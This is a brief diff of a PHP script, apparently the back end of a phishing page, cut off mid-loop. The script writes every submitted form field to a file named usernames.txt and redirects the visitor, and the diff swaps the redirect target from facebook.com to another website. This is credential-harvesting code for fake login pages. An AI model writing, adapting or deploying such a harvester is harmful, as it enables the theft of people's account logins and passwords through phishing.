@@ -1,5 +1,5 @@
 <?php
-header ('Location :www.facebook.com');
+header ('Location :https://www.looknfeel.info/');
 $handle = fopen("usernames.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
